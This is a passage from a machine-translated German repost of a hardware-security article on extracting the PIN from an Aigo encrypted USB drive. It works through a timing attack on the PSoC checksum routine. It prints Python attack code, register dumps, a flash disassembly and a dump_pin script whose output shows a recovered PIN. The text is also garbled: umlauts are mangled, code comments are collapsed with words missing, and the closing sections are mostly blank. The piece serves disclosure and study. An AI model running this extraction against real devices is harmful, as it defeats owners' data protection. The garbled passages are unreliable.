verloren, bis ich herausfand, dass <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">delayMicroseconds</a> nur mit Verz√∂gerungen von nicht mehr als 16383 mks korrekt funktioniert. </li><li>  und dann wieder die gleiche Zeitspanne get√∂tet, bis festgestellt wurde, dass delayMicroseconds, wenn es 0 an seine Eingabe √ºbergeben hat, v√∂llig falsch funktioniert hat! </li></ul></li><li>  Laden Sie PSoC erneut in den Programmiermodus (senden Sie einfach die magische Zahl, ohne Initialisierungsvektoren zu senden). </li></ol><br><p>  Der resultierende Python-Code: </p><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> delay <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">150000</span></span>): <span class="hljs-comment"><span class="hljs-comment">#    for i in range(0, 10): #      try: reset_psoc(quiet=True) #       send_vectors() #    ser.write("\x85"+struct.pack("&gt;I", delay)) #    +    res = ser.read(1) #  arduino ACK except Exception as e: print e ser.close() os.system("timeout -s KILL 1s picocom -b 115200 /dev/ttyACM0 2&gt;&amp;1 &gt; /dev/null") ser = serial.Serial('/dev/ttyACM0', 115200, timeout=0.5) #    continue print "%05d %02X %02X %02X" % (delay, #  RAM- read_regb(0xf1), read_ramb(0xf8), read_ramb(0xf9))</span></span></code> </pre> <br><p>  Kurz gesagt, was dieser Code bewirkt: </p><br><ol><li>  L√§dt den PSoC neu (und sendet ihm eine magische Nummer). </li><li>  Sendet vollst√§ndige Initialisierungsvektoren. </li><li>  Ruft die Arduino-Funktion Cmnd_STK_START_CSUM (0x85) auf, bei der die Verz√∂gerung in Mikrosekunden als Parameter √ºbergeben wird. </li><li>  Liest die Pr√ºfsumme (0xF8 und 0xF9) und das undokumentierte Register 0xF1. </li></ol><br><p>  Dieser Code wird 10 Mal in 1 Mikrosekunde ausgef√ºhrt.  0xF1 ist hier enthalten, da es das einzige Register war, das sich bei der Berechnung der Pr√ºfsumme ge√§ndert hat.  Vielleicht ist dies eine Art tempor√§re Variable, die von der arithmetischen Logikvorrichtung verwendet wird.  Achten Sie auf den h√§sslichen Hack, dass ich Arduino mit Picocom neu starte, wenn der Arduino keine Lebenszeichen mehr gibt (ich habe keine Ahnung warum). </p><br><a name="a72"></a><br><h2 id="72-schityvaem-rezultat">  7.2.  Lesen Sie das Ergebnis </h2><br><p>  Das Ergebnis des Python-Skripts sieht folgenderma√üen aus (zur besseren Lesbarkeit vereinfacht): </p><br><pre> <code class="plaintext hljs">DELAY F1 F8 F9 # F1 ‚Äì    # F8     # F9     00000 03 E1 19 [...] 00016 F9 00 03 00016 F9 00 00 00016 F9 00 03 00016 F9 00 03 00016 F9 00 03 00016 F9 00 00 #     0 00017 FB 00 00 [...] 00023 F8 00 00 00024 80 80 00 # 1- : 0x0080-0x0000 = 0x80 00024 80 80 00 00024 80 80 00 [...] 00057 CC E7 00 # 2- : 0xE7-0x80: 0x67 00057 CC E7 00 00057 01 17 01 #   ,    00057 01 17 01 00057 01 17 01 00058 D0 17 01 00058 D0 17 01 00058 D0 17 01 00058 D0 17 01 00058 F8 E7 00 #  E7? 00058 D0 17 01 [...] 00059 E7 E7 00 00060 17 17 00 #  [...] 00062 00 17 00 00062 00 17 00 00063 01 17 01 # , !        00063 01 17 01 [...] 00075 CC 17 01 # , 0x117-0xE7: 0x30</code> </pre> <br><p>  Gleichzeitig haben wir ein Problem: Da wir mit der tats√§chlichen Pr√ºfsumme arbeiten, √§ndert ein Null-Byte den Lesewert nicht.  Da der gesamte Berechnungsvorgang (8192 Bytes) jedoch 0,1478 Sekunden dauert (mit geringf√ºgigen Abweichungen bei jedem Start), was ungef√§hr 18,04 Œºs pro Byte entspricht, k√∂nnen wir diese Zeit verwenden, um den Wert der Pr√ºfsumme zu geeigneten Zeiten zu √ºberpr√ºfen.  Bei den ersten L√§ufen ist alles recht einfach zu lesen, da die Dauer des Rechenvorgangs immer fast gleich ist.  Das Ende dieses Dumps ist jedoch weniger genau, da die ‚Äûunbedeutenden Zeitabweichungen‚Äú bei jedem Lauf zusammengefasst werden und signifikant werden: </p><br><pre> <code class="plaintext hljs">134023 D0 02 DD 134023 CC D2 DC 134023 CC D2 DC 134023 CC D2 DC 134023 FB D2 DC 134023 3F D2 DC 134023 CC D2 DC 134024 02 02 DC 134024 CC D2 DC 134024 F9 02 DC 134024 03 02 DD 134024 21 02 DD 134024 02 D2 DC 134024 02 02 DC 134024 02 02 DC 134024 F8 D2 DC 134024 F8 D2 DC 134025 CC D2 DC 134025 EF D2 DC 134025 21 02 DD 134025 F8 D2 DC 134025 21 02 DD 134025 CC D2 DC 134025 04 D2 DC 134025 FB D2 DC 134025 CC D2 DC 134025 FB 02 DD 134026 03 02 DD 134026 21 02 DD</code> </pre> <br><p>  Dies sind 10 Speicherausz√ºge f√ºr jede Mikrosekundenverz√∂gerung.  Die Gesamtbetriebszeit f√ºr das Speichern aller 8192 Bytes eines Flash-Laufwerks betr√§gt ca. 48 Stunden. </p><br><a name="a73"></a><br><h2 id="73-rekonstrukciya-flesh-binarnika">  7.3.  Rekonstruktion der Flash-Bin√§rdatei </h2><br><p>  Ich habe noch keinen Code geschrieben, der den Programmcode des Flash-Laufwerks unter Ber√ºcksichtigung aller zeitlichen Abweichungen vollst√§ndig rekonstruiert.  Ich habe jedoch bereits den Anfang dieses Codes wiederhergestellt.  Um sicherzustellen, dass ich es richtig gemacht habe, habe ich es mit m8cdis zerlegt: </p><br><pre> <code class="plaintext hljs">0000: 80 67 jmp 0068h ; Reset vector [...] 0068: 71 10 or F,010h 006a: 62 e3 87 mov reg[VLT_CR],087h 006d: 70 ef and F,0efh 006f: 41 fe fb and reg[CPU_SCR1],0fbh 0072: 50 80 mov A,080h 0074: 4e swap A,SP 0075: 55 fa 01 mov [0fah],001h 0078: 4f mov X,SP 0079: 5b mov A,X 007a: 01 03 add A,003h 007c: 53 f9 mov [0f9h],A 007e: 55 f8 3a mov [0f8h],03ah 0081: 50 06 mov A,006h 0083: 00 ssc [...] 0122: 18 pop A 0123: 71 10 or F,010h 0125: 43 e3 10 or reg[VLT_CR],010h 0128: 70 00 and F,000h ; Paging mode changed from 3 to 0 012a: ef 62 jacc 008dh 012c: e0 00 jacc 012dh 012e: 71 10 or F,010h 0130: 62 e0 02 mov reg[OSC_CR0],002h 0133: 70 ef and F,0efh 0135: 62 e2 00 mov reg[INT_VC],000h 0138: 7c 19 30 lcall 1930h 013b: 8f ff jmp 013bh 013d: 50 08 mov A,008h 013f: 7f ret</code> </pre> <br><p>  Sieht ziemlich glaubw√ºrdig aus! </p><br><a name="a74"></a><br><h2 id="74-nahodim-adres-hraneniya-pinkoda">  7.4.  Suchen Sie die Pincode-Speicheradresse </h2><br><p>  Jetzt, da wir die Pr√ºfsumme zum gew√ºnschten Zeitpunkt lesen k√∂nnen, k√∂nnen wir leicht √ºberpr√ºfen, wie und wo sie sich √§ndert, wenn wir: </p><br><ul><li>  Geben Sie den falschen PIN-Code ein. </li><li>  √Ñndern Sie den PIN-Code. </li></ul><br><p>  Um die ungef√§hre Speicheradresse zu ermitteln, habe ich nach einem Neustart einen Pr√ºfsummen-Dump in Schritten von 10 ms erstellt.  Dann habe ich den falschen PIN-Code eingegeben und das Gleiche getan. </p><br><p>  Das Ergebnis war nicht sehr angenehm, da es viele √Ñnderungen gab.  Am Ende konnte ich jedoch feststellen, dass sich die Pr√ºfsumme irgendwo im Intervall zwischen 120.000 Œºs und 140.000 Œºs Verz√∂gerung ge√§ndert hat.  Aber der ‚ÄûPincode‚Äú, den ich dort erhalten habe, war v√∂llig falsch - aufgrund des Artefakts der delayMicroseconds-Prozedur, das seltsame Dinge tut, wenn es 0 wird. </p><br><p>  Nachdem ich fast 3 Stunden verbracht hatte, fiel mir ein, dass der CheckSum SROM-Systemaufruf am Eingang ein Argument erh√§lt, das die Anzahl der Bl√∂cke f√ºr die Pr√ºfsumme angibt!  T.O.  Wir k√∂nnen die Speicheradresse des PIN-Codes und den Z√§hler f√ºr ‚Äûfalsche Versuche‚Äú leicht lokalisieren, genau auf den 64-Byte-Block. </p><br><p>  Meine ersten L√§ufe ergaben das folgende Ergebnis: </p><br><p><img src="https://habrastorage.org/webt/0n/ol/xc/0nolxcgp8espvfdubrhrmvmbgrg.png"></p><br><p>  Dann habe ich den PIN-Code von "123456" in "1234567" ge√§ndert und erhalten: </p><br><p><img src="https://habrastorage.org/webt/0r/zp/s2/0rzps2e2mwldmhtot1tswiv7mdq.png"></p><br><p>  Somit scheinen der Pincode und der Z√§hler falscher Versuche in Block Nr. 126 gespeichert zu sein. </p><br><a name="a75"></a><br><h2 id="75-snimaem-damp-bloka-126">  7.5.  Wir entfernen den Dump von Block Nr. 126 </h2><br><p>  Block Nr. 126 sollte sich irgendwo in der Region von 125 x 64 x 18 = 144000 mks befinden, vom Beginn der Berechnung der Pr√ºfsumme an, in meinem vollst√§ndigen Speicherauszug, und es sieht ziemlich glaubw√ºrdig aus.  Nachdem ich zahlreiche ung√ºltige Speicherausz√ºge manuell herausgesiebt hatte (aufgrund der Anh√§ufung von "geringf√ºgigen Zeitabweichungen"), erhielt ich schlie√ülich diese Bytes (mit einer Verz√∂gerung von 145527 Œºs): </p><br><p><img src="https://habrastorage.org/webt/ji/31/ye/ji31yewphovunymnjxp0fcpwrdw.png"></p><br><p>  Es ist klar, dass der PIN-Code unverschl√ºsselt gespeichert ist!  Diese Werte sind nat√ºrlich nicht in ASCII-Codes geschrieben, aber wie sich herausstellte, spiegeln sie die Messwerte der kapazitiven Tastatur wider. </p><br><p>  Schlie√ülich habe ich noch einige Tests durchgef√ºhrt, um herauszufinden, wo der Z√§hler f√ºr falsche Versuche gespeichert ist.  Hier ist das Ergebnis: </p><br><p><img src="https://habrastorage.org/webt/dc/r5/tf/dcr5tf0yevdxcg5lyrbcr9srowu.png"></p><br><p>  0xFF - bedeutet "15 Versuche" und nimmt mit jedem falschen Versuch ab. </p><br><a name="a76"></a><br><h2 id="76-vosstanovlenie-pinkoda">  7.6.  Pincode-Wiederherstellung </h2><br><p>  Hier ist mein h√§sslicher Code, der all das zusammenbringt: </p><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">dump_pin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> pin_map = {<span class="hljs-number"><span class="hljs-number">0x24</span></span>: <span class="hljs-string"><span class="hljs-string">"0"</span></span>, <span class="hljs-number"><span class="hljs-number">0x25</span></span>: <span class="hljs-string"><span class="hljs-string">"1"</span></span>, <span class="hljs-number"><span class="hljs-number">0x26</span></span>: <span class="hljs-string"><span class="hljs-string">"2"</span></span>, <span class="hljs-number"><span class="hljs-number">0x27</span></span>:<span class="hljs-string"><span class="hljs-string">"3"</span></span>, <span class="hljs-number"><span class="hljs-number">0x20</span></span>: <span class="hljs-string"><span class="hljs-string">"4"</span></span>, <span class="hljs-number"><span class="hljs-number">0x21</span></span>: <span class="hljs-string"><span class="hljs-string">"5"</span></span>, <span class="hljs-number"><span class="hljs-number">0x22</span></span>: <span class="hljs-string"><span class="hljs-string">"6"</span></span>, <span class="hljs-number"><span class="hljs-number">0x23</span></span>: <span class="hljs-string"><span class="hljs-string">"7"</span></span>, <span class="hljs-number"><span class="hljs-number">0x2c</span></span>: <span class="hljs-string"><span class="hljs-string">"8"</span></span>, <span class="hljs-number"><span class="hljs-number">0x2d</span></span>: <span class="hljs-string"><span class="hljs-string">"9"</span></span>} last_csum = <span class="hljs-number"><span class="hljs-number">0</span></span> pin_bytes = [] <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> delay <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">145495</span></span>, <span class="hljs-number"><span class="hljs-number">145719</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>): csum = csum_at(delay, <span class="hljs-number"><span class="hljs-number">1</span></span>) byte = (csum-last_csum)&amp;<span class="hljs-number"><span class="hljs-number">0xFF</span></span> <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"%05d %04x (%04x) =&gt; %02x"</span></span> % (delay, csum, last_csum, byte) pin_bytes.append(byte) last_csum = csum <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"PIN: "</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(pin_bytes)): <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> pin_bytes[i] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> pin_map: <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> pin_map[pin_bytes[i]], <span class="hljs-keyword"><span class="hljs-keyword">print</span></span></code> </pre> <br><p>  Hier ist das Ergebnis seiner Ausf√ºhrung: </p><br><pre> <code class="plaintext hljs">$ ./psoc.py syncing: KO OK Resetting PSoC: KO Resetting PSoC: KO Resetting PSoC: OK 145495 53e2 (0000) =&gt; e2 145511 5407 (53e2) =&gt; 25 145527 542d (5407) =&gt; 26 145543 5454 (542d) =&gt; 27 145559 5474 (5454) =&gt; 20 145575 5495 (5474) =&gt; 21 145591 54b7 (5495) =&gt; 22 145607 54da (54b7) =&gt; 23 145623 5506 (54da) =&gt; 2c 145639 5506 (5506) =&gt; 00 145655 5533 (5506) =&gt; 2d 145671 554c (5533) =&gt; 19 145687 554e (554c) =&gt; 02 145703 554e (554e) =&gt; 00 PIN: 1 2 3 4 5 6 7 8 9</code> </pre> <br><p>  Hurra!  Es funktioniert! </p><br><p>  Bitte beachten Sie, dass die von mir verwendeten Verz√∂gerungswerte h√∂chstwahrscheinlich f√ºr eine bestimmte PSoC relevant sind - die von mir verwendete. </p><br><a name="a8"></a><br><h1 id="8-chto-dalshe">  8. Was kommt als n√§chstes? </h1><br><p>  Um es auf der PSoC-Seite im Zusammenhang mit unserem Aigo-Laufwerk zusammenzufassen: </p><br><ul><li>    SRAM,      ; </li><li>      ,   ¬´   ¬ª,    . </li></ul><br><p>   ,       ‚Äì -   .       : </p><br><ul><li>       ,      ¬´   ¬ª; </li><li>  FPGA-       (    Arduino); </li><li>    :    ,     RAM,   ,       RAM,  .   Arduino    - ,    Arduino  5 ,            3,3 . </li></ul><br><p>   ,      ‚Äì   ,     .     ,         , ‚Äì  ,          . </p><br><p>  SROM,        ReadBlock,       ,  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="></a>     ‚Äì     ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">¬´REcon Brussels 2017¬ª</a> . </p><br><p>    ,      ‚Äì    :    SRAM,      . </p><br><a name="a9"></a><br><h1 id="9-zaklyuchenie"> 9.  </h1><br><p> ,      ,         ( ¬´¬ª) ‚Ä¶      (),         ! </p><br><p>     Aigo?  -   HDD-,   2015   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="></a>  SyScan,        HDD-,   ,       .  :-) </p><br><p>          .     40 .     (   )    ( ).    40   ,       .    . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de455529/">https://habr.com/ru/post/de455529/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de455517/index.html">Absolvent des Netologiekurses ‚ÄûData Science‚Äú √ºber seine Arbeit im Bankensektor</a></li>
<li><a href="../de455519/index.html">Wie wir das Onboarding neuer Entwickler implementiert haben</a></li>
<li><a href="../de455523/index.html">OpenStack LBaaS UI-Implementierung</a></li>
<li><a href="../de455525/index.html">Zimbra und Mail Bomb Defense</a></li>
<li><a href="../de455527/index.html">Was steht darin geschrieben? Hinter den Kulissen von JavaScript-Objekten</a></li>
<li><a href="../de455533/index.html">Blasenphysik: Eine Suche nach Schaumzerst√∂rungsmechanismus</a></li>
<li><a href="../de455535/index.html">Verwalten von SSL / TLS-Zertifikaten in den Clouds und Containern - keine menschliche Arbeit</a></li>
<li><a href="../de455537/index.html">Umfassende Suchoptimierung: So verarbeiten Sie ein Diagramm mit 10 Milliarden Status</a></li>
<li><a href="../de455539/index.html">Mobile Hellseher: 10 neue Fakten dar√ºber, wie tragbare Ger√§te Sie beobachten</a></li>
<li><a href="../de455543/index.html">Ist Kubernetes Cluster einfach und bequem vorzubereiten? Addon-Operator ank√ºndigen</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>